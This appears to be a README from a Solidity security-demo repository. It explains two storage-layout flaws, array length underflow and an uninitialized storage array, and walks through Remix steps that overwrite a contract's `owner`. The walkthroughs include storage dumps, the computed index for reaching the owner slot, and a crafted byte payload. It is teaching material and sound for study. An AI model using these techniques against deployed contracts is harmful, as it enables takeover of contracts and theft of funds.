# Array length underflow. 

## Description:
The storage for a contract is addressed by 256-bit pointers. All storage 
variables for the contract are stored at different offsets in this single memory space. Every variable occupies a 32-byte 
"slot" in storage that is allocated in order of the variable declaration, starting at address 0. The first 32-byte 
variable will be at address 0, the second at address 1, and so on. Because mappings and dynamic arrays have fluctuating 
sizes, their contents cannot be stored inline in the slots. To solve this, hashing is used.                                                                                       

* In the case of a dynamic array, the reserved slot contains the length of the array as a uint256, and the array data 
itself is located sequentially at the address keccak256(p). Again, the chances of a collision, even for large arrays, 
are so small that they can be ignored.

In general, user-provided data cannot influence storage locations without going through the keccak256 hash function, 
the output of which is infeasible to influence. However, there is one exception: Dynamic arrays are stored sequentially 
starting at their hashed offset. If the index into this array is under attacker control, then the storage address is 
also controlled, within the bounds of the array. Of course, realistic array sizes will be insignificant compared to the 
keccak256 range, but the array length has uint256 type. So, as [others](https://github.com/pertsev/solidity_tricks/tree/master/Underflow) 
it can be (over|under)flowed by `array.length--` e.g. 

[Solidity documentation about memories](http://solidity.readthedocs.io/en/develop/miscellaneous.html#layout-of-state-variables-in-storage)
[Example inspired by](https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte)

### To reproduce:

1. Copy-paste `arrayLengthUnderflow.sol` to remix (or use `Connect to localhost` feature) and deploy `Array` contract. 
2. See Storage memory at debugger: 
```
{
   "0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563":{
      // Slot for array length
      "key":"0x0000000000000000000000000000000000000000000000000000000000000000",
      "value":"0x02"
   },
   "0x510e4e770828ddbf7f7b00ab00a9f6adaf81c0dc9cc85f1f8249c256942d61d9":{
      // first item of array (notice "key" and "0x290d..." above)
      "key":"0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563",
      "value":"0xaa"
   },
   "0x6c13d8c1c5df666ea9ca2a428504a3776c8ca01021c3a1524ca7d765f600979a":{
      // second item of array (notice "key" and "0x290d...63" above)
      "key":"0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564",
      "value":"0xbb"
   },
   "0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6":{
      // owner
      "key":"0x0000000000000000000000000000000000000000000000000000000000000001",
      "value":"0xca35b7d915458ef540ade6068dfe2f44e8fa733c"
   }
}
```
3. Call `underflow` function 3 times and see Storage: 
```
{
   "0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6":{
      // owner
      "key":"0x0000000000000000000000000000000000000000000000000000000000000001",
      "value":"0xca35b7d915458ef540ade6068dfe2f44e8fa733c"
   },
   "0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563":{
      // array length
      "key":"0x0000000000000000000000000000000000000000000000000000000000000000",
      "value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
   },
   "0x3a93c8bac389ae1de2d290d3fe962d3c151e3a269221b7341e4a601c50c12d94":{
      // last array elem (notice "0x29...63" and "0x29...62" above)
      "key":"0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e562",
      "value":"0x0000000000000000000000000000000000000000000000000000000000000000"
   }
}
```
4. Let's overwrite `owner`? Call `modify` with that args:
`"0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9e", "0xdeadbeef"`
And see storage now:
```
{
   "0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563":{
      "key":"0x0000000000000000000000000000000000000000000000000000000000000000",
      "value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
   },
   "0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6":{
      //owner!
      "key":"0x0000000000000000000000000000000000000000000000000000000000000001",
      "value":"0x00000000000000000000000000000000000000000000000000000000deadbeef"
   }
}
```

Stop. How have you known the index `"0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9e"`?
Ok. Check following Python code to clarification:
```
        //array length   //sha3(0x00)                                                         //owner's slot number
>>> hex(2**256         - 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 + 1                    )
'0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9eL'
```

# Uninitialized array. 

## Description:
By default, `copy` array data and `owner` variable refer to zero cell at Storage memory. (Read more about Storage above)
So, changing `copy` affect `owner` also.  

### To reproduce:

1. Copy-paste `uninitialized.sol` to remix (or use `Connect to localhost` feature) and deploy `Uninitialized` contract. 
2. Then call `rewrite` function with a byte array: 
```
["0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA",
"0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA", "0xAA",
"0x39", "0x05", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00",
"0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00"]
```
3. `owner` should be `0xaaaaa...`, `balance` == 1337
